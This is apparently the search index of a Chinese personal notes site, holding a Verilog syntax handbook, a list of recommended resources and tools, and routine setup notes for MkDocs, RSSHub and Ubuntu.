\u8fde\u7eed\u8d4b\u503c\uff08\u5982 assign x = y; \uff09\uff0c\u8be5\u8d4b\u503c\u65b9\u5f0f\u53ea\u80fd\u7528\u4e8e\u8fc7\u7a0b\u5757\uff08\u5982 always \u5757\uff09\u4e4b\u5916\uff1b \u963b\u585e\u8d4b\u503c\uff08\u5982 x = y; \uff09\uff0c\u8be5\u8d4b\u503c\u65b9\u5f0f\u53ea\u80fd\u7528\u5728\u8fc7\u7a0b\u5757\uff08\u5982 always@\uff08*\uff09 \uff09\u5185\uff1b \u975e\u963b\u585e\u8d4b\u503c\uff08\u5982 x <= y; \uff09\uff0c\u8be5\u8d4b\u503c\u65b9\u5f0f\u53ea\u80fd\u7528\u5728\u8fc7\u7a0b\u5757\u5185\uff08 \u5982 always@\uff08posedge clk\uff09 \uff09\u3002 \u5728\u8bbe\u8ba1Verilog\u6a21\u5757\u65f6\uff0c\u8bf7\u9075\u5faa\u4ee5\u4e0b\u539f\u5219\uff1a \u5728\u7ec4\u5408\u903b\u8f91\u7684 always \u5757\u5185\u91c7\u7528\u963b\u585e\u8d4b\u503c\uff1b \u65f6\u5e8f\u903b\u8f91\u7684 always \u5757\u5185\u91c7\u7528\u975e\u963b\u585e\u8d4b\u503c\u3002 \u4ece\u539f\u7406\u4e0a\u6765\u8bb2\uff0c\u975e\u963b\u585e\u8d4b\u503c\u7684\u8bed\u53e5\u662f\u540c\u65f6\u6267\u884c\u7684\uff1b\u800c\u963b\u585e\u8d4b\u503c\u7684\u8bed\u53e5\u662f\u987a\u5e8f\u6267\u884c\u7684\u3002 // \u5728 clk \u4e0a\u5347\u6cbf\u65f6\uff0c\u4ea4\u6362 a \u548c b\u3002 always @( posedge clk ) begin a <= b ; b <= a ; end \u6211\u4eec\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4e0b\u65b9\u7684\u4f8b\u5b50\uff0c\u6765\u5177\u4f53\u611f\u53d7\u963b\u585e\u8d4b\u503c\u548c\u975e\u963b\u585e\u8d4b\u503c\u7684\u533a\u522b\u3002 always @( posedge clk ) begin b = a ; c = b ; end \u963b\u585e\u8d4b\u503c\u751f\u6210\u7684\u7535\u8def\u56fe\u5982\u4e0b\u56fe\u6240\u793a\uff1a always @( posedge clk ) begin b <= a ; c <= b ; end \u975e\u963b\u585e\u8d4b\u503c\u751f\u6210\u7684\u7535\u8def\u56fe\u5982\u4e0b\u56fe\u6240\u793a\uff1a 2.2 \u4f7f\u7528 always \u7684\u7ec4\u5408\u7535\u8def 3 \u4e00\u822c\u90fd\u8bf4\u7ec4\u5408\u903b\u8f91\u7535\u8def\u4f7f\u7528 always@(*) {} \uff0c\u90a3\u4e48\u5176\u4e2d\u7684 * \u8868\u8fbe\u7684\u662f\u4ec0\u4e48\u610f\u601d\u5462\uff1f \u7b54\uff1a always \u8bed\u53e5\u540e\u7684\u62ec\u53f7\u5185\u653e\u7684\u662f\u654f\u611f\u53d8\u91cf\u5217\u8868\uff0c\u5bf9\u4e8e always@(*) out = a & b | c ^ d \u6765\u8bf4\uff0c\u5176\u5b8c\u6574\u5199\u6cd5\u662f always@(a, b, c, d) out = a & b | c ^ d \u3002 \u7ec4\u5408\u903b\u8f91\u7535\u8def\u4e2d\uff0c always \u5757\u548c assign \u8bed\u53e5\u4e8c\u8005\u751f\u6210\u7684\u786c\u4ef6\u7535\u8def\u4e00\u822c\u662f\u7b49\u6548\u7684\u3002 \u4f46\u662f always \u8bed\u53e5\u53ef\u4ee5\u652f\u6301\u66f4\u52a0\u590d\u6742\u7684\u8bed\u6cd5\u3002 always \u4e2d\u53ef\u4ee5\u4f7f\u7528 if...else... \uff0c case \u7b49\u8bed\u6cd5\u3002 always \u4e2d\uff0c\u7b49\u53f7\u5de6\u8fb9\u7684\u53d8\u91cf\u4e3a Reg \u7c7b\u578b\uff1b assign \u4e2d\uff0c\u7b49\u53f7\u5de6\u8fb9\u7684\u53d8\u91cf\u4e3a wire \u7c7b\u578b\u3002 always \u5757\u5185\u53ef\u5bf9\u591a\u4e2a\u4fe1\u53f7\u8fdb\u884c\u8d4b\u503c\uff0c assign \u8bed\u53e5\u53ea\u80fd\u5bf9\u4e00\u4e2a\u4fe1\u53f7\u8fdb\u884c\u8d4b\u503c\u3002 3 \u6613\u9519\u70b9 3.1 \u5206\u652f\u8bed\u53e5\u7f3a\u5931\u5bfc\u81f4\u9501\u5b58\u5668 4 always @( * ) begin if ( cpu_overheated ) shut_off_computer = 1 ; end \u7531\u4e8e\u7f3a\u5c11 else \u7684\u60c5\u51b5\uff0c shut_off_computer \u5728 cpu_overhead \u4e3a 0 \u65f6\uff0c\u4f1a\u4fdd\u6301\u539f\u6765\u7684\u503c\u3002 \u82e5\u60f3\u8981\u5728 cpu_overheated = 0 \u65f6\uff0c\u5c06 shut_off_computer \u7f6e\u4e3a 0\uff0c\u5219\u9700\u8981\u4f7f\u7528\u4e0b\u65b9\u903b\u8f91\uff1a always @( * ) begin if ( cpu_overheated ) shut_off_computer = 1 ; else shut_off_computer = 0 ; end 3.2 \u7ec4\u5408\u903b\u8f91\u4e2d\u81ea\u6211\u53cd\u9988 // \u9519\u8bef\u793a\u8303 always @( * ) begin // \u7ec4\u5408\u903b\u8f91 a = a + 1 ; // \u81ea\u6211\u53cd\u9988 end https://stackoverflow.com/questions/5360508/using-wire-or-reg-with-input-or-output-in-verilog \u21a9 https://verilogoj.ustc.edu.cn/oj/problem/68 \u21a9 https://verilogoj.ustc.edu.cn/oj/problem/62 \u21a9 https://verilogoj.ustc.edu.cn/oj/problem/95 \u21a9","title":"Verilog \u8bed\u6cd5\u624b\u518c"},{"location":"misc/verilog/#verilog","text":"Info \u56e0\u4e3a\u8981\u5f53 2022-2023 Fall \u8ba1\u7b97\u673a\u7cfb\u7edf\u2161 \u7684\u52a9\u6559\uff0c\u6240\u4ee5\u7279\u5730\u6765\u590d\u4e60\u4e00\u4e0b verilog\u3002","title":"Verilog \u8bed\u6cd5\u624b\u518c"},{"location":"misc/verilog/#0","text":"USTC Verilog OJ | \u638c\u63e1 Verilog \u57fa\u7840\u8bed\u6cd5\u4e0e\u6613\u9519\u70b9 Synthesizable Coding of Verilog | \u9605\u8bfb17-31\u9875","title":"0 \u63a8\u8350\u8d44\u6599"},{"location":"misc/verilog/#1","text":"","title":"1 \u8bed\u6cd5\u8865\u5145"},{"location":"misc/verilog/#11-case","text":"always @( * ) begin case ( sel ) // case \u8bed\u53e5\u4f7f\u7528\u65b9\u6cd5\uff1acase ... endcase 3 'b000 : begin // \u591a\u8bed\u53e5\u4f7f\u7528 begin...end \u5305\u88f9 out = data0 ; end 3 'b001 : out = data1 ; 3 'b010 : out = data2 ; 3 'b011 : out = data3 ; default : out = 4 'b0 ; endcase end","title":"1.1 Case"},{"location":"misc/verilog/#12","text":"module top_module ( input [ 4 : 0 ] a , b , c , d , e , f , output [ 7 : 0 ] w , x , y , z ); assign { w , x , y , z } = { a , b , c , d , e , f , 2 'b11 }; // \u4f4d\u62fc\u63a5\uff0c\u9700\u4fdd\u6301\u524d\u540e\u4f4d\u5bbd\u4e00\u81f4\u3002 endmodule","title":"1.2 \u4f4d\u62fc\u63a5"},{"location":"misc/verilog/#13","text":"x1 = & a [ 3 : 0 ] // AND: a[3]&a[2]&a[1]&a[0]. Equivalent to (a[3:0] == 4'hf) x2 = | b [ 3 : 0 ] // OR: b[3]|b[2]|b[1]|b[0]. Equivalent to (b[3:0] != 4'h0) x3 = ^ c [ 2 : 0 ] // XOR: c[2]^c[1]^c[0]","title":"1.3 \u5f52\u7ea6\u8fd0\u7b97\u7b26"},{"location":"misc/verilog/#14","text":"\u5728\u5b9a\u4e49\u6a21\u5757\u65f6\uff0c\u6211\u4eec\u4f1a\u5728 \u62ec\u53f7 \u4e2d\u5b9a\u4e49\u6b64\u6a21\u5757\u7684\u8bfb\u53e3\u548c\u5199\u53e3\uff0c\u540c\u65f6\u5728 module...endmodule \u4e2d\u63cf\u8ff0\u6574\u4e2a\u6a21\u5757\u7684\u884c\u4e3a\uff08\u5305\u62ec\u4e00\u4e9b assign \u8bed\u53e5\u3001 always \u5757\uff0c\u6291\u6216\u662f reg \u548c wire \u7684\u7533\u660e\u7b49\u7b49\uff09\u3002 \u5bf9\u4e8e\u6a21\u5757\u7684\u5199\u53e3\uff0c\u4e00\u5171\u6709\u4e24\u79cd\u5199\u6cd5\uff0c\u4e00\u79cd\u662f output reg xxx \uff0c\u4e00\u79cd\u662f output wire xxx \uff08\u4e5f\u53ef\u88ab\u7b80\u5199\u4e3a output xxx \uff09\u3002 1 \u82e5\u5199\u53e3\u5728 always \u8bed\u53e5\u4e2d\u88ab\u8d4b\u503c\uff0c\u5219\u58f0\u660e\u6210 reg \u7c7b\u578b\uff1b \u82e5\u5199\u53e3\u5728 assign \u8bed\u53e5\u4e2d\u88ab\u8d4b\u503c\uff0c\u5219\u58f0\u660e\u6210 wire \u7c7b\u578b\uff08wire \u53ef\u7701\u7565\uff09\u3002 \u5173\u4e8e\u6a21\u5757\u7684\u5b9e\u4f8b\u5316\uff0c\u53ef\u4ee5\u53c2\u8003\u4e0b\u65b9\u4ee3\u7801\u3002 module mod_a ( // \u4e00\u4e2a\u6a21\u5757 output out1 , // \u5199\u53e3 input in1 , // \u8bfb\u53e3 input in2 ); // \u63cf\u8ff0\u6a21\u5757\u884c\u4e3a assign out1 = in1 & in2 ; endmodule module top_module ( // \u9876\u5c42\u6a21\u5757 input a , input b , output out1 ); // \u5b9e\u4f8b\u5316\u6a21\u5757 mod_a\uff0c\u683c\u5f0f\uff1a[\u6a21\u5757\u540d] [\u5b9e\u4f8b\u540d\u79f0]( ); mod_a mod ( . in1 ( a ), // \u5c06 top_module \u7684 a \u4e0e mod_a \u7684 in1 \u8fde\u63a5 . in2 ( b ), . out1 ( out1 ) ); endmodule","title":"1.4 \u6a21\u5757\u5b9a\u4e49\u53ca\u5176\u5b9e\u4f8b\u5316"},{"location":"misc/verilog/#2","text":"","title":"2 \u8bed\u6cd5\u533a\u5206"},{"location":"misc/verilog/#21-2","text":"\u5728Verilog\u4e2d\uff0c\u6709\u4e09\u79cd\u8d4b\u503c\u65b9\u5f0f\uff0c\u5206\u522b\u4e3a\uff1a \u8fde\u7eed\u8d4b\u503c\uff08\u5982 assign x = y; \uff09\uff0c\u8be5\u8d4b\u503c\u65b9\u5f0f\u53ea\u80fd\u7528\u4e8e\u8fc7\u7a0b\u5757\uff08\u5982 always \u5757\uff09\u4e4b\u5916\uff1b \u963b\u585e\u8d4b\u503c\uff08\u5982 x = y; \uff09\uff0c\u8be5\u8d4b\u503c\u65b9\u5f0f\u53ea\u80fd\u7528\u5728\u8fc7\u7a0b\u5757\uff08\u5982 always@\uff08*\uff09 \uff09\u5185\uff1b \u975e\u963b\u585e\u8d4b\u503c\uff08\u5982 x <= y; \uff09\uff0c\u8be5\u8d4b\u503c\u65b9\u5f0f\u53ea\u80fd\u7528\u5728\u8fc7\u7a0b\u5757\u5185\uff08 \u5982 always@\uff08posedge clk\uff09 \uff09\u3002 \u5728\u8bbe\u8ba1Verilog\u6a21\u5757\u65f6\uff0c\u8bf7\u9075\u5faa\u4ee5\u4e0b\u539f\u5219\uff1a \u5728\u7ec4\u5408\u903b\u8f91\u7684 always \u5757\u5185\u91c7\u7528\u963b\u585e\u8d4b\u503c\uff1b \u65f6\u5e8f\u903b\u8f91\u7684 always \u5757\u5185\u91c7\u7528\u975e\u963b\u585e\u8d4b\u503c\u3002 \u4ece\u539f\u7406\u4e0a\u6765\u8bb2\uff0c\u975e\u963b\u585e\u8d4b\u503c\u7684\u8bed\u53e5\u662f\u540c\u65f6\u6267\u884c\u7684\uff1b\u800c\u963b\u585e\u8d4b\u503c\u7684\u8bed\u53e5\u662f\u987a\u5e8f\u6267\u884c\u7684\u3002 // \u5728 clk \u4e0a\u5347\u6cbf\u65f6\uff0c\u4ea4\u6362 a \u548c b\u3002 always @( posedge clk ) begin a <= b ; b <= a ; end \u6211\u4eec\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4e0b\u65b9\u7684\u4f8b\u5b50\uff0c\u6765\u5177\u4f53\u611f\u53d7\u963b\u585e\u8d4b\u503c\u548c\u975e\u963b\u585e\u8d4b\u503c\u7684\u533a\u522b\u3002 always @( posedge clk ) begin b = a ; c = b ; end \u963b\u585e\u8d4b\u503c\u751f\u6210\u7684\u7535\u8def\u56fe\u5982\u4e0b\u56fe\u6240\u793a\uff1a always @( posedge clk ) begin b <= a ; c <= b ; end \u975e\u963b\u585e\u8d4b\u503c\u751f\u6210\u7684\u7535\u8def\u56fe\u5982\u4e0b\u56fe\u6240\u793a\uff1a","title":"2.1 \u963b\u585e\u8d4b\u503c &amp; \u975e\u963b\u585e\u8d4b\u503c2"},{"location":"misc/verilog/#22-always-3","text":"\u4e00\u822c\u90fd\u8bf4\u7ec4\u5408\u903b\u8f91\u7535\u8def\u4f7f\u7528 always@(*) {} \uff0c\u90a3\u4e48\u5176\u4e2d\u7684 * \u8868\u8fbe\u7684\u662f\u4ec0\u4e48\u610f\u601d\u5462\uff1f \u7b54\uff1a always \u8bed\u53e5\u540e\u7684\u62ec\u53f7\u5185\u653e\u7684\u662f\u654f\u611f\u53d8\u91cf\u5217\u8868\uff0c\u5bf9\u4e8e always@(*) out = a & b | c ^ d \u6765\u8bf4\uff0c\u5176\u5b8c\u6574\u5199\u6cd5\u662f always@(a, b, c, d) out = a & b | c ^ d \u3002 \u7ec4\u5408\u903b\u8f91\u7535\u8def\u4e2d\uff0c always \u5757\u548c assign \u8bed\u53e5\u4e8c\u8005\u751f\u6210\u7684\u786c\u4ef6\u7535\u8def\u4e00\u822c\u662f\u7b49\u6548\u7684\u3002 \u4f46\u662f always \u8bed\u53e5\u53ef\u4ee5\u652f\u6301\u66f4\u52a0\u590d\u6742\u7684\u8bed\u6cd5\u3002 always \u4e2d\u53ef\u4ee5\u4f7f\u7528 if...else... \uff0c case \u7b49\u8bed\u6cd5\u3002 always \u4e2d\uff0c\u7b49\u53f7\u5de6\u8fb9\u7684\u53d8\u91cf\u4e3a Reg \u7c7b\u578b\uff1b assign \u4e2d\uff0c\u7b49\u53f7\u5de6\u8fb9\u7684\u53d8\u91cf\u4e3a wire \u7c7b\u578b\u3002 always \u5757\u5185\u53ef\u5bf9\u591a\u4e2a\u4fe1\u53f7\u8fdb\u884c\u8d4b\u503c\uff0c assign \u8bed\u53e5\u53ea\u80fd\u5bf9\u4e00\u4e2a\u4fe1\u53f7\u8fdb\u884c\u8d4b\u503c\u3002","title":"2.2 \u4f7f\u7528 always \u7684\u7ec4\u5408\u7535\u8def3"},{"location":"misc/verilog/#3","text":"","title":"3 \u6613\u9519\u70b9"},{"location":"misc/verilog/#31-4","text":"always @( * ) begin if ( cpu_overheated ) shut_off_computer = 1 ; end \u7531\u4e8e\u7f3a\u5c11 else \u7684\u60c5\u51b5\uff0c shut_off_computer \u5728 cpu_overhead \u4e3a 0 \u65f6\uff0c\u4f1a\u4fdd\u6301\u539f\u6765\u7684\u503c\u3002 \u82e5\u60f3\u8981\u5728 cpu_overheated = 0 \u65f6\uff0c\u5c06 shut_off_computer \u7f6e\u4e3a 0\uff0c\u5219\u9700\u8981\u4f7f\u7528\u4e0b\u65b9\u903b\u8f91\uff1a always @( * ) begin if ( cpu_overheated ) shut_off_computer = 1 ; else shut_off_computer = 0 ; end","title":"3.1 \u5206\u652f\u8bed\u53e5\u7f3a\u5931\u5bfc\u81f4\u9501\u5b58\u56684"},{"location":"misc/verilog/#32","text":"// \u9519\u8bef\u793a\u8303 always @( * ) begin // \u7ec4\u5408\u903b\u8f91 a = a + 1 ; // \u81ea\u6211\u53cd\u9988 end https://stackoverflow.com/questions/5360508/using-wire-or-reg-with-input-or-output-in-verilog \u21a9 https://verilogoj.ustc.edu.cn/oj/problem/68 \u21a9 https://verilogoj.ustc.edu.cn/oj/problem/62 \u21a9 https://verilogoj.ustc.edu.cn/oj/problem/95 \u21a9","title":"3.2 \u7ec4\u5408\u903b\u8f91\u4e2d\u81ea\u6211\u53cd\u9988"},{"location":"rec/","text":"\u4e00\u4e9b\u63a8\u8350 \u63a8\u8350\u9605\u8bfb \u63d0\u95ee\u7684\u667a\u6167 The illustrated guide to a Ph.D. \u7cbe\u901a\u4e00\u4ef6\u4e8b\u9700\u898110000\u5c0f\u65f6\uff0c\u4f46\u5b66\u4f1a\u4e00\u4ef6\u4e8b\uff0c\u53ea\u9700\u898120\u5c0f\u65f6 \u5b66\u4e60\u8d44\u6e90 CS\u81ea\u5b66\u6307\u5357|\u81ea\u5b66\u6307\u5357 \u9b3c\u8c37\u5927\u5b66|\u81ea\u5b66\u6307\u5357/\u56fd\u5916\u8d44\u6e90\u7ffb\u8bd1 \u6d59\u6c5f\u5927\u5b66\u8bfe\u7a0b\u8d44\u6e90\u5171\u4eab\u8ba1\u5212 The Missing Semester of Your CS Education|CS\u524d\u7f6e\u77e5\u8bc6 \u54d4\u54e9\u54d4\u54e9\u848b\u708e\u5ca9|\u64cd\u4f5c\u7cfb\u7edf/\u8ba1\u7b97\u673a\u7cfb\u7edf\u57fa\u7840 Learn X in Y minutes|\u5feb\u901f\u5165\u95e8\u4e00\u95e8\u7f16\u7a0b\u8bed\u8a00 \u8001\u77f3\u8c08\u82af|\u82af\u7247\u9886\u57df\u79d1\u666e \u63a8\u8350\u8f6f\u4ef6 Notion|All in one\u5728\u7ebf\u7b14\u8bb0/\u4e2a\u4eba\u535a\u5ba2/\u534f\u4f5c\u8f6f\u4ef6 Obsidian|\u79bb\u7ebfmarkdown\u7f16\u8f91\u5668/\u77e5\u8bc6\u5e93 Listary|\u672c\u5730\u6587\u4ef6\u67e5\u627e/\u8f6f\u4ef6\u52a0\u8f7d \u63a8\u8350\u8ba2\u9605 \u962e\u4e00\u5cf0\u7684\u7f51\u7edc\u65e5\u5fd7-\u79d1\u6280\u7231\u597d\u8005\u5468\u520a \u54b8\u9c7c\u8086 \u5c0f\u5de5\u5177\u63a8\u8350 Excalidraw|\u5728\u7ebf\u65e0\u9650\u753b\u5e03 carbon|\u4ee3\u7801\u5757\u56fe\u7247\u751f\u6210 Zlibrary|\u4e16\u754c\u6700\u5927\u7684\u514d\u8d39\u7535\u5b50\u4e66\u5e93","title":"\u4e00\u4e9b\u63a8\u8350"},{"location":"rec/#_1","text":"","title":"\u4e00\u4e9b\u63a8\u8350"},{"location":"rec/#_2","text":"\u63d0\u95ee\u7684\u667a\u6167 The illustrated guide to a Ph.D. \u7cbe\u901a\u4e00\u4ef6\u4e8b\u9700\u898110000\u5c0f\u65f6\uff0c\u4f46\u5b66\u4f1a\u4e00\u4ef6\u4e8b\uff0c\u53ea\u9700\u898120\u5c0f\u65f6","title":"\u63a8\u8350\u9605\u8bfb"},{"location":"rec/#_3","text":"CS\u81ea\u5b66\u6307\u5357|\u81ea\u5b66\u6307\u5357 \u9b3c\u8c37\u5927\u5b66|\u81ea\u5b66\u6307\u5357/\u56fd\u5916\u8d44\u6e90\u7ffb\u8bd1 \u6d59\u6c5f\u5927\u5b66\u8bfe\u7a0b\u8d44\u6e90\u5171\u4eab\u8ba1\u5212 The Missing Semester of Your CS Education|CS\u524d\u7f6e\u77e5\u8bc6 \u54d4\u54e9\u54d4\u54e9\u848b\u708e\u5ca9|\u64cd\u4f5c\u7cfb\u7edf/\u8ba1\u7b97\u673a\u7cfb\u7edf\u57fa\u7840 Learn X in Y minutes|\u5feb\u901f\u5165\u95e8\u4e00\u95e8\u7f16\u7a0b\u8bed\u8a00 \u8001\u77f3\u8c08\u82af|\u82af\u7247\u9886\u57df\u79d1\u666e","title":"\u5b66\u4e60\u8d44\u6e90"},{"location":"rec/#_4","text":"Notion|All in one\u5728\u7ebf\u7b14\u8bb0/\u4e2a\u4eba\u535a\u5ba2/\u534f\u4f5c\u8f6f\u4ef6 Obsidian|\u79bb\u7ebfmarkdown\u7f16\u8f91\u5668/\u77e5\u8bc6\u5e93 Listary|\u672c\u5730\u6587\u4ef6\u67e5\u627e/\u8f6f\u4ef6\u52a0\u8f7d","title":"\u63a8\u8350\u8f6f\u4ef6"},{"location":"rec/#_5","text":"\u962e\u4e00\u5cf0\u7684\u7f51\u7edc\u65e5\u5fd7-\u79d1\u6280\u7231\u597d\u8005\u5468\u520a \u54b8\u9c7c\u8086","title":"\u63a8\u8350\u8ba2\u9605"},{"location":"rec/#_6","text":"Excalidraw|\u5728\u7ebf\u65e0\u9650\u753b\u5e03 carbon|\u4ee3\u7801\u5757\u56fe\u7247\u751f\u6210 Zlibrary|\u4e16\u754c\u6700\u5927\u7684\u514d\u8d39\u7535\u5b50\u4e66\u5e93","title":"\u5c0f\u5de5\u5177\u63a8\u8350"},{"location":"tutorials/","text":"Introduction \u5728\u8fd9\u91cc\u4f1a\u653e\u7f6e\u5e73\u5e38\u641e\u9879\u76ee/\u6478\u9c7c\u65f6\u9047\u5230\u7684\u4e00\u4e9b\u95ee\u9898\uff0c\u4ee5\u53ca\u5176\u89e3\u51b3\u65b9\u5f0f\u3002\u5e0c\u671b\u5bf9\u4f60\u80fd\u6709\u6240\u5e2e\u52a9\u3002","title":"Introduction"},{"location":"tutorials/#introduction","text":"\u5728\u8fd9\u91cc\u4f1a\u653e\u7f6e\u5e73\u5e38\u641e\u9879\u76ee/\u6478\u9c7c\u65f6\u9047\u5230\u7684\u4e00\u4e9b\u95ee\u9898\uff0c\u4ee5\u53ca\u5176\u89e3\u51b3\u65b9\u5f0f\u3002\u5e0c\u671b\u5bf9\u4f60\u80fd\u6709\u6240\u5e2e\u52a9\u3002","title":"Introduction"},{"location":"tutorials/idea/","text":"IDEA \u8e29\u5751\u8bb0\u5f55 Info \u6700\u8fd1\u5f00\u59cb\u4f7f\u7528 JetBrain \u7684\u4ea7\u54c1\uff0c\u201c\u9996\u5f53\u5176\u51b2\u201d\u7684\u5f53\u7136\u5c31\u662f IDEA \u4e86\uff0c\u7528\u6b64\u8d34\u8bb0\u5f55\u4e00\u4e0b\u4f7f\u7528\u8fc7\u7a0b\u4e2d\u8e29\u5751/\u611f\u89c9\u5b9e\u7528\u7684\u70b9\u3002","title":"IDEA \u8e29\u5751\u8bb0\u5f55"},{"location":"tutorials/idea/#idea","text":"Info \u6700\u8fd1\u5f00\u59cb\u4f7f\u7528 JetBrain \u7684\u4ea7\u54c1\uff0c\u201c\u9996\u5f53\u5176\u51b2\u201d\u7684\u5f53\u7136\u5c31\u662f IDEA \u4e86\uff0c\u7528\u6b64\u8d34\u8bb0\u5f55\u4e00\u4e0b\u4f7f\u7528\u8fc7\u7a0b\u4e2d\u8e29\u5751/\u611f\u89c9\u5b9e\u7528\u7684\u70b9\u3002","title":"IDEA \u8e29\u5751\u8bb0\u5f55"},{"location":"tutorials/mkdocs/","text":"MkDocs \u5b89\u88c5\u8bb0\u5f55 \u672c\u5730\u73af\u5883\u914d\u7f6e pip install mkdocs-material mkdocs new . \u4fee\u6539mkdocs.yml \u8bbe\u7f6ematerial\u4e3b\u9898 theme: name: material \u8fdc\u7a0b\u90e8\u7f72 \u91c7\u7528Github\u8fdc\u7a0b\u90e8\u7f72 1. \u521b\u5efagithub\u4ed3\u5e93 2. \u4e0a\u4f20\u672c\u5730\u7684\u4ee3\u7801 3. \u8bbe\u7f6egithub action \u4f7f\u7528\u4e0b\u65b9\u4ee3\u7801\u521b\u5efa\u4e00\u4e2a\u65b0\u7684github action name: ci on: push: branches: - master - main jobs: deploy: runs-on: ubuntu-latest steps: - uses: actions/checkout@v2 - uses: actions/setup-python@v2 with: python-version: 3.x - run: pip install mkdocs-material - run: mkdocs gh-deploy --force 4. \u8bbe\u7f6e\u6e32\u67d3\u5206\u652f \u5728Setting\u9875\u8bbe\u7f6e\u6e32\u67d3\u7684\u5206\u652f 5. \u81ea\u52a8\u6e32\u67d3 \u7b49\u5019\u6e32\u67d3\u6210\u529f\uff0c\u5373\u53ef\u8bbf\u95ee <username>.github.io/repository_name \u53c2\u8003\u8d44\u6599 \u4f7f\u7528MkDocs \u5feb\u901f\u642d\u5efa\u6587\u6863\u7cfb\u7edf MkDocs Material Github\u591a\u57df\u540d\u90e8\u7f72","title":"MkDocs \u5b89\u88c5\u8bb0\u5f55"},{"location":"tutorials/mkdocs/#mkdocs","text":"","title":"MkDocs \u5b89\u88c5\u8bb0\u5f55"},{"location":"tutorials/mkdocs/#_1","text":"pip install mkdocs-material mkdocs new .","title":"\u672c\u5730\u73af\u5883\u914d\u7f6e"},{"location":"tutorials/mkdocs/#mkdocsyml","text":"\u8bbe\u7f6ematerial\u4e3b\u9898 theme: name: material","title":"\u4fee\u6539mkdocs.yml"},{"location":"tutorials/mkdocs/#_2","text":"\u91c7\u7528Github\u8fdc\u7a0b\u90e8\u7f72","title":"\u8fdc\u7a0b\u90e8\u7f72"},{"location":"tutorials/mkdocs/#1-github","text":"","title":"1. \u521b\u5efagithub\u4ed3\u5e93"},{"location":"tutorials/mkdocs/#2","text":"","title":"2. \u4e0a\u4f20\u672c\u5730\u7684\u4ee3\u7801"},{"location":"tutorials/mkdocs/#3-github-action","text":"\u4f7f\u7528\u4e0b\u65b9\u4ee3\u7801\u521b\u5efa\u4e00\u4e2a\u65b0\u7684github action name: ci on: push: branches: - master - main jobs: deploy: runs-on: ubuntu-latest steps: - uses: actions/checkout@v2 - uses: actions/setup-python@v2 with: python-version: 3.x - run: pip install mkdocs-material - run: mkdocs gh-deploy --force","title":"3. \u8bbe\u7f6egithub action"},{"location":"tutorials/mkdocs/#4","text":"\u5728Setting\u9875\u8bbe\u7f6e\u6e32\u67d3\u7684\u5206\u652f","title":"4. \u8bbe\u7f6e\u6e32\u67d3\u5206\u652f"},{"location":"tutorials/mkdocs/#5","text":"\u7b49\u5019\u6e32\u67d3\u6210\u529f\uff0c\u5373\u53ef\u8bbf\u95ee <username>.github.io/repository_name","title":"5. \u81ea\u52a8\u6e32\u67d3"},{"location":"tutorials/mkdocs/#_3","text":"\u4f7f\u7528MkDocs \u5feb\u901f\u642d\u5efa\u6587\u6863\u7cfb\u7edf MkDocs Material Github\u591a\u57df\u540d\u90e8\u7f72","title":"\u53c2\u8003\u8d44\u6599"},{"location":"tutorials/rsshub/","text":"RSSHub \u4f7f\u7528\u8bb0\u5f55 Note \u76ee\u524d\u91c7\u7528\u7684\u662fdocker\u90e8\u7f72\uff0c\u957f\u671f\u4f7f\u7528\u6bd4\u8f83\u7a33\u5b9a\uff0c\u7f3a\u70b9\u53ef\u80fd\u662f\u4e3a\u914d\u5408RSSHub radar\uff0c\u9700\u8981\u5076\u5c14\u624b\u52a8\u66f4\u65b0docker\u955c\u50cf\u3002 RSSHub\u5b89\u88c5 \u9700\u8981\u4e00\u4e2a\u670d\u52a1\u5668/\u4e0d\u65ad\u7535\u7684\u673a\u5b50 \u5b89\u88c5docker \u90e8\u7f72RSSHub\u955c\u50cf $ docker pull diygod/rsshub $ docker run -d --name rsshub -p 1200 :1200 diygod/rsshub \u6253\u5f00ip:1200\uff0c\u82e5\u663e\u793a\u4e0b\u65b9\u5185\u5bb9\uff0c\u5219\u90e8\u7f72\u6210\u529f RSSHub\u66f4\u65b0 $ docker stop rsshub $ docker rm rsshub $ docker pull diygod/rsshub $ docker run -d --name rsshub -p 1200 :1200 diygod/rsshub Reference [RSSHub Docker\u90e8\u7f72](https://docs.rsshub.app/install/","title":"RSSHub \u4f7f\u7528\u8bb0\u5f55"},{"location":"tutorials/rsshub/#rsshub","text":"Note \u76ee\u524d\u91c7\u7528\u7684\u662fdocker\u90e8\u7f72\uff0c\u957f\u671f\u4f7f\u7528\u6bd4\u8f83\u7a33\u5b9a\uff0c\u7f3a\u70b9\u53ef\u80fd\u662f\u4e3a\u914d\u5408RSSHub radar\uff0c\u9700\u8981\u5076\u5c14\u624b\u52a8\u66f4\u65b0docker\u955c\u50cf\u3002","title":"RSSHub \u4f7f\u7528\u8bb0\u5f55"},{"location":"tutorials/rsshub/#rsshub_1","text":"\u9700\u8981\u4e00\u4e2a\u670d\u52a1\u5668/\u4e0d\u65ad\u7535\u7684\u673a\u5b50 \u5b89\u88c5docker \u90e8\u7f72RSSHub\u955c\u50cf $ docker pull diygod/rsshub $ docker run -d --name rsshub -p 1200 :1200 diygod/rsshub \u6253\u5f00ip:1200\uff0c\u82e5\u663e\u793a\u4e0b\u65b9\u5185\u5bb9\uff0c\u5219\u90e8\u7f72\u6210\u529f","title":"RSSHub\u5b89\u88c5"},{"location":"tutorials/rsshub/#rsshub_2","text":"$ docker stop rsshub $ docker rm rsshub $ docker pull diygod/rsshub $ docker run -d --name rsshub -p 1200 :1200 diygod/rsshub","title":"RSSHub\u66f4\u65b0"},{"location":"tutorials/rsshub/#reference","text":"[RSSHub Docker\u90e8\u7f72](https://docs.rsshub.app/install/","title":"Reference"},{"location":"tutorials/ubuntu/","text":"Ubuntu22.04 \u5b89\u88c5\u8bb0\u5f55 0. \u57fa\u7840\u8f6f\u4ef6 $ sudo apt install tmux $ sudo apt install git $ sudo apt install vim $ sudo apt install make $ sudo apt install g++ 1. Chrome\u6d4f\u89c8\u5668 \u53c2\u8003\u5b89\u88c5\u6587\u7ae0 2. \u4e2d\u6587\u8f93\u5165\u6cd5 \u53c2\u8003\u5b89\u88c5\u6587\u7ae0 3. \u5c40\u57df\u7f51 ssh \u767b\u5f55 1) zjunet ZJUNET\u4ed3\u5e93 $ zjunet user add # \u6ce8\u610fuser name \u540e\u9762\u8981\u63a5\u4e0a@abc\uff0c\u5176\u4e2da\u8868\u793a10\u5143\uff0cb\u8868\u793a30\u5143\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002 $ zjunet vpn -c 2) ssh\u670d\u52a1 $ sudo apt-get install openssh-server 5. vivado \u5b89\u88c5vivado2019.2 